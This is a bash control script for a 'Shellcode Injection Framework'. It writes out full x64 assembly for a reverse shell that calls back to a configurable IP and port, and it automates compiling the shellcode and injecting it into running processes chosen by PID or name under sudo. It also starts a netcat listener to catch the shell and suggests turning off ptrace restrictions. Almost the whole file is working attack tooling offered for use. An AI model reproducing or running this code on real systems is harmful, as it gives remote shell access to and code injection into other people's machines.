#!/bin/bash
#===============================================================================
# ShellcodeManager - Enterprise-grade Control Application
# 
# This script provides a comprehensive management interface for the
# Shellcode Injection Framework, automating the entire workflow from
# compilation to deployment with advanced configuration options.
#===============================================================================

# Terminal colors for improved interface readability
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
BOLD='\033[1m'
RESET='\033[0m'

#===============================================================================
# CONFIGURATION PARAMETERS
#===============================================================================

# Default network configuration for reverse shell
DEFAULT_IP="192.168.1.10"
DEFAULT_PORT="4444"

# Framework component paths
FRAMEWORK_DIR="$(pwd)"
REVERSE_SHELL_ASM="${FRAMEWORK_DIR}/reverse_shell.asm"
MAKEFILE="${FRAMEWORK_DIR}/Makefile"

# Binary paths (will be verified during initialization)
REVERSE_SHELL="${FRAMEWORK_DIR}/reverse_shell"
SHELLCODE_EXTRACTOR="${FRAMEWORK_DIR}/shellcode_extractor"
SHELLCODE_INJECTOR="${FRAMEWORK_DIR}/shellcode_injector"
SHELLCODE_LOADER="${FRAMEWORK_DIR}/shellcode_loader"

# Output locations
SHELLCODE_BIN="${FRAMEWORK_DIR}/shellcode.bin"
SHELLCODE_H="${FRAMEWORK_DIR}/shellcode.h"

# Logging configuration
LOG_DIR="${FRAMEWORK_DIR}/logs"
LOG_FILE="${LOG_DIR}/shellcode_manager.log"
ERROR_LOG="${LOG_DIR}/error.log"

# Listener parameters
NC_PARAMS="-lvp"

#===============================================================================
# UTILITY FUNCTIONS
#===============================================================================

# Log message to file with timestamp
log() {
    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
    echo "${timestamp} - $1" >> "${LOG_FILE}"
}

# Display formatted status message
status() {
    echo -e "${BLUE}[*]${RESET} $1"
    log "STATUS: $1"
}

# Display formatted success message
success() {
    echo -e "${GREEN}[+]${RESET} $1"
    log "SUCCESS: $1"
}

# Display formatted error message
error() {
    echo -e "${RED}[!]${RESET} $1" >&2
    log "ERROR: $1"
    echo "$1" >> "${ERROR_LOG}"
}

# Display formatted warning message
warning() {
    echo -e "${YELLOW}[!]${RESET} $1"
    log "WARNING: $1"
}

# Display formatted info message
info() {
    echo -e "${CYAN}[i]${RESET} $1"
}

# Display section header
section() {
    echo -e "\n${PURPLE}${BOLD}=== $1 ===${RESET}\n"
    log "SECTION: $1"
}

# Check if a command exists
command_exists() {
    command -v "$1" &> /dev/null
}

# Confirm action with user
confirm() {
    local prompt="$1"
    local default="$2"
    
    if [[ "$default" == "Y" ]]; then
        prompt="${prompt} [Y/n] "
    else
        prompt="${prompt} [y/N] "
    fi
    
    read -r -p "$prompt" response
    response=${response,,}  # Convert to lowercase
    
    if [[ "$default" == "Y" ]]; then
        [[ -z "$response" || "$response" == "y" || "$response" == "yes" ]]
    else
        [[ "$response" == "y" || "$response" == "yes" ]]
    fi
}

# Pause execution until user presses Enter
pause() {
    read -r -p "Press Enter to continue..."
}

# Check if running with root privileges
check_root() {
    if [[ $EUID -ne 0 ]]; then
        warning "Some operations may require root privileges."
        if confirm "Do you want to restart with sudo?" "Y"; then
            exec sudo "$0" "$@"
            exit 1
        fi
    else
        success "Running with root privileges."
    fi
}

# Initialize the environment
initialize() {
    section "Initializing Environment"
    
    # Create log directory if it doesn't exist
    if [[ ! -d "${LOG_DIR}" ]]; then
        status "Creating log directory at ${LOG_DIR}"
        mkdir -p "${LOG_DIR}"
        chmod 750 "${LOG_DIR}"
    fi
    
    # Check for required dependencies
    status "Checking dependencies..."
    local missing_deps=0
    
    for cmd in gcc nasm make objcopy netcat nc; do
        if command_exists "$cmd"; then
            success "Found $cmd"
        else
            error "Required dependency not found: $cmd"
            missing_deps=$((missing_deps + 1))
        fi
    done
    
    if [[ $missing_deps -gt 0 ]]; then
        error "$missing_deps dependencies are missing. Please install them and try again."
        exit 1
    fi
    
    # Verify framework files
    if [[ ! -f "${MAKEFILE}" ]]; then
        error "Makefile not found at ${MAKEFILE}"
        exit 1
    fi
    
    if [[ ! -f "${REVERSE_SHELL_ASM}" ]]; then
        status "Reverse shell assembly template not found, creating it..."
        create_reverse_shell_template
    fi
    
    success "Environment initialized successfully"
}

#===============================================================================
# BUILD FUNCTIONS
#===============================================================================

# Create the reverse shell assembly template
create_reverse_shell_template() {
    status "Creating reverse shell assembly template..."
    
    cat > "${REVERSE_SHELL_ASM}" << 'EOF'
; Position-independent x64 reverse shell shellcode
; Connects back to specified IP:PORT
; Usage: nasm -f elf64 reverse_shell.asm && ld reverse_shell.o -o reverse_shell

BITS 64

section .text
    global _start

_start:
    ; Clear registers to avoid null bytes
    xor rax, rax
    xor rbx, rbx
    xor rcx, rcx
    xor rdx, rdx
    
    ; Create socket
    ; int socket(int domain, int type, int protocol)
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
    ; AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0
    push 2      ; AF_INET
    pop rdi
    push 1      ; SOCK_STREAM
    pop rsi
    ; rdx already 0 for protocol
    push 41     ; socket syscall number
    pop rax
    syscall
    
    ; Save socket file descriptor in r15
    mov r15, rax
    
    ; Setup sockaddr_in structure on stack
    ; struct sockaddr_in {
    ;   sa_family_t sin_family;     // AF_INET (2)
    ;   in_port_t sin_port;         // Port in network byte order
    ;   struct in_addr sin_addr;    // IP address
    ;   char sin_zero[8];           // Padding
    ; }
    
    ; Build structure on stack (in reverse)
    push rdx                ; padding with rdx = 0
    
    ; IP address - Change to target IP (example: 192.168.1.10 = 0x0a01a8c0)
    mov dword [rsp-4], 0x0a01a8c0  ; 192.168.1.10 in network byte order
    sub rsp, 4
    
    ; Port number - Change to target port (example: 4444 = 0x115c)
    mov word [rsp-2], 0x5c11       ; Port 4444 in network byte order (htons(4444))
    sub rsp, 2
    
    ; Address family
    mov word [rsp-2], 0x2          ; AF_INET (2)
    sub rsp, 2
    
    ; Connect
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
    mov rdi, r15            ; Socket descriptor
    mov rsi, rsp            ; Pointer to sockaddr_in structure
    push 16                 ; sizeof(sockaddr_in) = 16
    pop rdx
    push 42                 ; connect syscall number
    pop rax
    syscall
    
    ; Duplicate file descriptors
    ; dup2(sockfd, stdin/stdout/stderr)
    mov rdi, r15            ; Socket descriptor
    xor rsi, rsi            ; 0 - stdin
    push 33                 ; dup2 syscall number
    pop rax
    syscall
    
    mov rdi, r15            ; Socket descriptor
    push 1                  ; 1 - stdout
    pop rsi
    push 33                 ; dup2 syscall number
    pop rax
    syscall
    
    mov rdi, r15            ; Socket descriptor
    push 2                  ; 2 - stderr
    pop rsi
    push 33                 ; dup2 syscall number
    pop rax
    syscall
    
    ; Execute shell
    ; execve("/bin/sh", NULL, NULL)
    push rdx                ; NULL terminator (rdx is still 0)
    mov rbx, 0x68732f2f6e69622f ; "/bin//sh" in hex
    push rbx
    mov rdi, rsp            ; Pointer to "/bin//sh"
    push rdx                ; NULL terminator for argv[]
    mov rsi, rsp            ; argv = ["/bin//sh", NULL]
    ; rdx already 0 for envp = NULL
    push 59                 ; execve syscall number
    pop rax
    syscall
    
    ; Exit (unlikely to be reached)
    push 60                 ; exit syscall number
    pop rax
    xor rdi, rdi            ; Exit code 0
    syscall
EOF
    
    success "Reverse shell assembly template created successfully"
}

# Clean the build environment
clean_build() {
    section "Cleaning Build Environment"
    
    status "Removing compiled binaries and intermediate files..."
    make clean &> /dev/null
    
    if [[ $? -eq 0 ]]; then
        success "Build environment cleaned successfully"
    else
        error "Failed to clean build environment"
        return 1
    fi
    
    return 0
}

# Compile the framework
compile_framework() {
    section "Compiling Shellcode Injection Framework"
    
    status "Building all components..."
    make all &> /dev/null
    
    if [[ $? -ne 0 ]]; then
        error "Compilation failed. Check build logs for details."
        return 1
    fi
    
    # Verify that all components were built
    local missing_components=0
    
    for component in "${REVERSE_SHELL}" "${SHELLCODE_EXTRACTOR}" "${SHELLCODE_INJECTOR}" "${SHELLCODE_LOADER}"; do
        if [[ ! -f "$component" ]]; then
            error "Component not built: $component"
            missing_components=$((missing_components + 1))
        else
            success "Component built: $(basename "$component")"
        fi
    done
    
    if [[ $missing_components -gt 0 ]]; then
        error "$missing_components components failed to build."
        return 1
    fi
    
    status "Extracting shellcode..."
    "${SHELLCODE_EXTRACTOR}" "${REVERSE_SHELL}" "${SHELLCODE_H}" &> /dev/null
    
    if [[ $? -ne 0 || ! -f "${SHELLCODE_H}" ]]; then
        error "Failed to extract shellcode."
        return 1
    fi
    
    success "Shellcode extraction successful: ${SHELLCODE_H}"
    success "Framework compiled successfully"
    
    return 0
}

#===============================================================================
# CONFIGURATION FUNCTIONS
#===============================================================================

# Convert dotted decimal IP to hex format for shellcode
ip_to_hex() {
    local ip="$1"
    local hex=""
    local IFS="."
    local octets=($ip)
    
    # Ensure we have 4 octets
    if [[ ${#octets[@]} -ne 4 ]]; then
        return 1
    fi
    
    # Convert to network byte order (big-endian) and hexadecimal
    printf -v hex "0x%02x%02x%02x%02x" "${octets[3]}" "${octets[2]}" "${octets[1]}" "${octets[0]}"
    echo "$hex"
}

# Convert decimal port to hex format for shellcode (network byte order)
port_to_hex() {
    local port="$1"
    
    # Ensure the port is a valid number between 1 and 65535
    if ! [[ "$port" =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
        return 1
    fi
    
    # Convert to network byte order (big-endian) and hexadecimal
    printf -v hex "0x%04x" "$port"
    # Swap bytes for network byte order
    echo "0x${hex:4:2}${hex:2:2}"
}

# Update the IP and port in the reverse shell shellcode
update_reverse_shell_config() {
    section "Configuring Reverse Shell"
    
    # Get current values
    local current_ip=$(grep -o "mov dword \[rsp-4\], 0x[0-9a-fA-F]\+" "${REVERSE_SHELL_ASM}" | awk '{print $4}')
    local current_port=$(grep -o "mov word \[rsp-2\], 0x[0-9a-fA-F]\+" "${REVERSE_SHELL_ASM}" | awk '{print $4}')
    
    info "Current configuration:"
    info "  IP address (hex): ${current_ip}"
    info "  Port (hex): ${current_port}"
    
    # Prompt for new IP address
    read -r -p "Enter new IP address [${DEFAULT_IP}]: " ip
    ip=${ip:-${DEFAULT_IP}}
    
    # Convert IP to hex
    local ip_hex=$(ip_to_hex "$ip")
    if [[ $? -ne 0 ]]; then
        error "Invalid IP address format: $ip"
        return 1
    fi
    
    # Prompt for new port
    read -r -p "Enter new port [${DEFAULT_PORT}]: " port
    port=${port:-${DEFAULT_PORT}}
    
    # Convert port to hex
    local port_hex=$(port_to_hex "$port")
    if [[ $? -ne 0 ]]; then
        error "Invalid port number: $port"
        return 1
    fi
    
    status "Updating shellcode configuration..."
    status "  IP: $ip (${ip_hex})"
    status "  Port: $port (${port_hex})"
    
    # Update the reverse shell assembly file
    sed -i "s/mov dword \[rsp-4\], 0x[0-9a-fA-F]\+/mov dword [rsp-4], ${ip_hex}/" "${REVERSE_SHELL_ASM}"
    sed -i "s/mov word \[rsp-2\], 0x[0-9a-fA-F]\+/mov word [rsp-2], ${port_hex}/" "${REVERSE_SHELL_ASM}"
    
    success "Reverse shell configuration updated successfully"
    
    # Ask if the user wants to recompile
    if confirm "Do you want to recompile the framework with the new configuration?" "Y"; then
        compile_framework
    fi
    
    return 0
}

#===============================================================================
# SHELLCODE INJECTION FUNCTIONS
#===============================================================================

# Analyze shellcode for bad characters
analyze_shellcode() {
    section "Analyzing Shellcode"
    
    if [[ ! -f "${REVERSE_SHELL}" ]]; then
        error "Reverse shell binary not found. Please compile the framework first."
        return 1
    fi
    
    status "Performing shellcode analysis..."
    "${SHELLCODE_LOADER}" --file "${SHELLCODE_BIN}" --analyze
    
    success "Shellcode analysis completed"
    return 0
}

# Test shellcode execution locally
test_shellcode() {
    section "Testing Shellcode Execution"
    
    if [[ ! -f "${SHELLCODE_BIN}" ]]; then
        error "Shellcode binary not found. Please compile the framework first."
        return 1
    fi
    
    warning "Running shellcode locally can be dangerous. Make sure you understand what it does."
    if ! confirm "Do you want to continue?" "N"; then
        info "Shellcode test aborted by user."
        return 0
    fi
    
    status "Executing shellcode in test environment..."
    "${SHELLCODE_LOADER}" --file "${SHELLCODE_BIN}" --execute --verbose
    
    success "Shellcode test completed"
    return 0
}

# Inject shellcode into a target process
inject_shellcode() {
    section "Shellcode Injection"
    
    if [[ ! -f "${SHELLCODE_INJECTOR}" || ! -f "${SHELLCODE_BIN}" ]]; then
        error "Required files not found. Please compile the framework first."
        return 1
    fi
    
    # Display injection options
    info "Shellcode Injection Options:"
    info "  1. Inject into self (test mode)"
    info "  2. Inject into process by PID"
    info "  3. Inject into process by name"
    info "  4. Execute a program with injected shellcode"
    info "  0. Cancel"
    
    read -r -p "Select an option: " injection_mode
    
    case "$injection_mode" in
        1) # Self injection
            status "Self-injection mode selected"
            if confirm "This will execute the shellcode in the current process. Continue?" "N"; then
                status "Injecting shellcode into self..."
                sudo "${SHELLCODE_INJECTOR}" --self --shellcode "${SHELLCODE_BIN}" --verbose
            else
                info "Operation cancelled by user."
            fi
            ;;
            
        2) # Inject by PID
            status "Process injection by PID selected"
            # Show running processes
            echo -e "\nRunning processes:"
            ps -eo pid,user,comm | head -n 10
            echo "..."
            
            read -r -p "Enter target PID: " target_pid
            if [[ -z "$target_pid" ]]; then
                error "No PID specified."
                return 1
            fi
            
            # Verify the PID exists
            if ! ps -p "$target_pid" > /dev/null; then
                error "Process with PID $target_pid does not exist."
                return 1
            fi
            
            if confirm "This will inject shellcode into process $target_pid. Continue?" "N"; then
                status "Injecting shellcode into process $target_pid..."
                sudo "${SHELLCODE_INJECTOR}" --pid "$target_pid" --shellcode "${SHELLCODE_BIN}" --verbose
            else
                info "Operation cancelled by user."
            fi
            ;;
            
        3) # Inject by name
            status "Process injection by name selected"
            read -r -p "Enter process name: " process_name
            if [[ -z "$process_name" ]]; then
                error "No process name specified."
                return 1
            fi
            
            status "Searching for process: $process_name..."
            target_pid=$(pgrep -x "$process_name" | head -n 1)
            
            if [[ -z "$target_pid" ]]; then
                error "Process '$process_name' not found."
                return 1
            fi
            
            if confirm "This will inject shellcode into process '$process_name' (PID: $target_pid). Continue?" "N"; then
                status "Injecting shellcode into process $target_pid ($process_name)..."
                sudo "${SHELLCODE_INJECTOR}" --pid "$target_pid" --shellcode "${SHELLCODE_BIN}" --verbose
            else
                info "Operation cancelled by user."
            fi
            ;;
            
        4) # Execute program with injected shellcode
            status "Execute with injection mode selected"
            read -r -p "Enter path to executable: " target_exe
            if [[ -z "$target_exe" || ! -f "$target_exe" ]]; then
                error "Invalid executable path: $target_exe"
                return 1
            fi
            
            if confirm "This will execute '$target_exe' with injected shellcode. Continue?" "N"; then
                status "Executing '$target_exe' with injected shellcode..."
                sudo "${SHELLCODE_INJECTOR}" --exec "$target_exe" --shellcode "${SHELLCODE_BIN}" --verbose
            else
                info "Operation cancelled by user."
            fi
            ;;
            
        0) # Cancel
            info "Operation cancelled by user."
            ;;
            
        *)
            error "Invalid option: $injection_mode"
            return 1
            ;;
    esac
    
    success "Shellcode injection operation completed"
    return 0
}

#===============================================================================
# LISTENER FUNCTIONS
#===============================================================================

# Start a listener for the reverse shell
start_listener() {
    section "Starting Reverse Shell Listener"
    
    # Extract the current IP and port from the shellcode
    local current_ip_hex=$(grep -o "mov dword \[rsp-4\], 0x[0-9a-fA-F]\+" "${REVERSE_SHELL_ASM}" | awk '{print $4}')
    local current_port_hex=$(grep -o "mov word \[rsp-2\], 0x[0-9a-fA-F]\+" "${REVERSE_SHELL_ASM}" | awk '{print $4}')
    
    # Extract port from hex
    local port_dec=$(printf "%d" "${current_port_hex}")
    
    status "Configured listener port: $port_dec"
    
    # Check if we have netcat available
    local nc_cmd
    if command_exists "nc"; then
        nc_cmd="nc"
    elif command_exists "netcat"; then
        nc_cmd="netcat"
    else
        error "Neither 'nc' nor 'netcat' found. Please install netcat."
        return 1
    fi
    
    # Check if the port is already in use
    if netstat -tuln | grep -q ":$port_dec "; then
        error "Port $port_dec is already in use."
        if ! confirm "Do you want to use a different port?" "Y"; then
            return 1
        fi
        
        read -r -p "Enter new port: " port_dec
        if [[ -z "$port_dec" ]]; then
            error "No port specified."
            return 1
        fi
    fi
    
    status "Starting listener on port $port_dec..."
    info "Waiting for connections... (Press Ctrl+C to exit)"
    
    # Start listener with netcat
    sudo "$nc_cmd" ${NC_PARAMS} "$port_dec"
    
    return 0
}

#===============================================================================
# MENU SYSTEM
#===============================================================================

# Display the main menu
show_main_menu() {
    section "Shellcode Injection Framework - Control Panel"
    
    info "1. Build Operations"
    info "2. Configure Shellcode"
    info "3. Analyze Shellcode"
    info "4. Inject Shellcode"
    info "5. Start Reverse Shell Listener"
    info "9. Advanced Options"
    info "0. Exit"
    
    read -r -p "Select an option: " menu_choice
    
    case "$menu_choice" in
        1) # Build Operations
            section "Build Operations"
            info "1. Compile Framework"
            info "2. Clean Build Environment"
            info "3. Rebuild Framework (Clean + Compile)"
            info "0. Back to Main Menu"
            
            read -r -p "Select an option: " build_choice
            
            case "$build_choice" in
                1) compile_framework ;;
                2) clean_build ;;
                3) clean_build && compile_framework ;;
                0) return 0 ;;
                *) error "Invalid option: $build_choice" ;;
            esac
            ;;
            
        2) # Configure Shellcode
            update_reverse_shell_config
            ;;
            
        3) # Analyze Shellcode
            analyze_shellcode
            ;;
            
        4) # Inject Shellcode
            inject_shellcode
            ;;
            
        5) # Start Listener
            start_listener
            ;;
            
        9) # Advanced Options
            section "Advanced Options"
            info "1. Test Shellcode Execution"
            info "2. View Framework Logs"
            info "3. Check System Compatibility"
            info "0. Back to Main Menu"
            
            read -r -p "Select an option: " advanced_choice
            
            case "$advanced_choice" in
                1) test_shellcode ;;
                2) 
                    if [[ -f "${LOG_FILE}" ]]; then
                        less "${LOG_FILE}"
                    else
                        error "Log file not found: ${LOG_FILE}"
                    fi
                    ;;
                3)
                    section "System Compatibility Check"
                    # Check kernel version
                    local kernel_version=$(uname -r)
                    info "Kernel version: $kernel_version"
                    
                    # Check ptrace settings
                    local ptrace_scope=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)
                    if [[ -n "$ptrace_scope" ]]; then
                        if [[ "$ptrace_scope" -eq 0 ]]; then
                            success "ptrace_scope: $ptrace_scope (unrestricted)"
                        else
                            warning "ptrace_scope: $ptrace_scope (restricted)"
                            info "Consider setting ptrace_scope to 0 for better injection support:"
                            info "echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope"
                        fi
                    fi
                    
                    # Check for ASLR
                    local aslr=$(cat /proc/sys/kernel/randomize_va_space 2>/dev/null)
                    if [[ -n "$aslr" ]]; then
                        if [[ "$aslr" -eq 0 ]]; then
                            success "ASLR: Disabled"
                        else
                            info "ASLR: Enabled (value: $aslr)"
                        fi
                    fi
                    
                    # Check SELinux status
                    if command_exists "sestatus"; then
                        local selinux=$(sestatus | grep "SELinux status" | awk '{print $3}')
                        if [[ "$selinux" == "enabled" ]]; then
                            warning "SELinux: Enabled (may restrict some injection techniques)"
                        else
                            success "SELinux: Disabled"
                        fi
                    fi
                    
                    # Check for GDB
                    if command_exists "gdb"; then
                        success "GDB: Installed (useful for debugging)"
                    else
                        warning "GDB: Not found (recommended for debugging)"
                    fi
                    ;;
                0) return 0 ;;
                *) error "Invalid option: $advanced_choice" ;;
            esac
            ;;
            
        0) # Exit
            section "Exiting Shellcode Manager"
            exit 0
            ;;
            
        *) error "Invalid option: $menu_choice" ;;
    esac
    
    pause
    return 0
}

#===============================================================================
# MAIN EXECUTION
#===============================================================================

main() {
    # Setup signal handlers
    trap 'echo -e "\n${RED}[!]${RESET} Operation interrupted"; exit 1' INT TERM
    
    # Display banner
    clear
    cat << "EOF"
ShellXF      
EOF
    echo -e "${BOLD}Advanced Shellcode Management Framework${RESET}"
    echo -e "Enterprise-grade control application for the Shellcode Injection Framework\n"
    
    # Check for root privileges
    check_root "$@"
    
    # Initialize environment
    initialize
    
    # Main menu loop
    while true; do
        show_main_menu
    done
}

# Start the application
main "$@"